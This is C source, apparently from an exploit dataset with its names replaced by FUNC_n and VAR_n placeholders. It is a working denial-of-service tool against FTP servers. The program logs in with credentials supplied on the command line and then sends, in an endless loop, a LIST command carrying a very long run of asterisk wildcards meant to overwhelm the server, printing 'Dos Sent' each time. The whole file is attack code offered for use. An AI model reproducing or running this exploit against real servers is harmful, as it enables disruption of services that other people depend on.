
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


typedef int user ;
struct TYPE_2__ {int s_addr; } ;
struct sockaddr_in {void* sin_port; TYPE_1__ sin_addr; int sin_family; } ;
struct sockaddr {int dummy; } ;
struct hostent {int h_length; int * h_addr_list; int h_addrtype; } ;
typedef int servAddr ;
typedef int pass ;
typedef int localAddr ;
typedef int host ;
typedef int buffer ;


 int VAR_0 ;
 char VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 int VAR_4 ;
 int FUNC_0 (int,struct sockaddr*,int) ;
 int FUNC_1 (int) ;
 int FUNC_2 (int,struct sockaddr*,int) ;
 int FUNC_3 (int) ;
 struct hostent* FUNC_4 (char*) ;
 char FUNC_5 (int,char**,char*) ;
 int FUNC_6 (int ) ;
 void* FUNC_7 (int) ;
 int FUNC_8 (char*,int ,int ) ;
 int FUNC_9 (char*,int ,int) ;
 int VAR_5 ;
 int FUNC_10 (char*) ;
 int FUNC_11 (char*,...) ;
 int FUNC_12 (int,char*,int,int ) ;
 int FUNC_13 (int,char*,int ,int ) ;
 int FUNC_14 (char*,int,char*,...) ;
 int FUNC_15 (int ,int ,int ) ;
 int FUNC_16 (char*) ;
 int FUNC_17 (char*,int ,int) ;
 scalar_t__ FUNC_18 (char*,char*) ;
 int FUNC_19 (char*) ;

FUNC_20(int VAR_6, char *VAR_7[]) {
 char VAR_8[1000],VAR_9[255],VAR_10[255],VAR_11[255],VAR_12;
 int VAR_13, VAR_14, VAR_15=0;
 struct sockaddr_in VAR_16, VAR_17;
 struct hostent *VAR_18;

if ( VAR_6 < 3) {
FUNC_19(VAR_7[0]);
}

while ((VAR_12 = FUNC_5 (VAR_6, VAR_7, "h:u:p:")) != VAR_1)
       switch(VAR_12)
       {
               case 'h':
                       FUNC_17(VAR_9,VAR_5,sizeof(VAR_9));
                       break;
               case 'u':
                       FUNC_17(VAR_10,VAR_5,sizeof(VAR_10));
                       break;
               case 'p':
                       FUNC_17(VAR_11,VAR_5,sizeof(VAR_11));
                       break;
       }

while(1) {

 VAR_18 = FUNC_4(VAR_9);
 if(VAR_18==((void*)0)) {
   FUNC_11("unknown host '%s'\n",VAR_9);
   FUNC_3(1);
 }

 VAR_17.sin_family = VAR_18->h_addrtype;
 FUNC_8((char *) &VAR_17.sin_addr.s_addr, VAR_18->h_addr_list[0], VAR_18->h_length);
 VAR_17.sin_port = FUNC_7(VAR_3);
 VAR_13 = FUNC_15(VAR_0, VAR_4, 0);
 if(VAR_13<0) {
   FUNC_10("cannot open socket ");
   FUNC_3(1);
 }

 VAR_16.sin_family = VAR_0;
 VAR_16.sin_addr.s_addr = FUNC_6(VAR_2);
 VAR_16.sin_port = FUNC_7(0);

 VAR_14 = FUNC_0(VAR_13, (struct sockaddr *) &VAR_16, sizeof(VAR_16));
 if(VAR_14<0) {
   FUNC_11("%d: cannot bind port TCP %u\n",VAR_13,VAR_3);
   FUNC_10("error ");
   FUNC_3(1);
 }

 FUNC_11("Trying To Connect To [%s]\n",VAR_9);
 VAR_14 = FUNC_2(VAR_13, (struct sockaddr *) &VAR_17, sizeof(VAR_17));
 if(VAR_14<0) {
   FUNC_10("cannot connect ");
   FUNC_3(1);
 }
   FUNC_11("Trying Login With [%s]\n",VAR_10);
   FUNC_14(VAR_8,sizeof(VAR_8), "USER %s\r\n", VAR_10);
   VAR_14 = FUNC_13(VAR_13, VAR_8, FUNC_16(VAR_8), 0);
   FUNC_9(VAR_8,0,sizeof(VAR_8));

while(1)
       {
       VAR_14=FUNC_12(VAR_13,VAR_8,sizeof(VAR_8),0);
       if(FUNC_18(VAR_8,"331")) break;
       if(FUNC_18(VAR_8,"421"))
               {
               FUNC_11("Access Denied on your arse..\n");
               FUNC_3(0);
               }
       }

   FUNC_11("Sending Pass - [%s]\n",VAR_11);
   FUNC_9(VAR_8,0,sizeof(VAR_8));
   FUNC_14(VAR_8,sizeof(VAR_8), "PASS %s\r\n", VAR_11);
   VAR_14 = FUNC_13(VAR_13,VAR_8, FUNC_16(VAR_8), 0);

while(1)
       {
       VAR_14=FUNC_12(VAR_13,VAR_8,sizeof(VAR_8),0);
       if(FUNC_18(VAR_8,"230")) break;
       if(FUNC_18(VAR_8,"421"))
               {
               FUNC_11("Access Denied on your arse..\n");
               FUNC_3(0);
               }

       if(FUNC_18(VAR_8,"530"))
               {
               FUNC_11("Access Denied: Login Incorrect!\n");
               FUNC_3(0);
               }
}

   FUNC_9(VAR_8,0,sizeof(VAR_8));
   FUNC_14(VAR_8,sizeof(VAR_8), "LIST ***********************************************************************************************************************************************************************************************.*\r\n");
   VAR_14 = FUNC_13(VAR_13,VAR_8, FUNC_16(VAR_8), 0);
   FUNC_11("Dos Sent\n");

}

   if(VAR_14<0) {
     FUNC_10("cannot send data ");
     FUNC_1(VAR_13);
     FUNC_3(1);
   }
return 0;
}
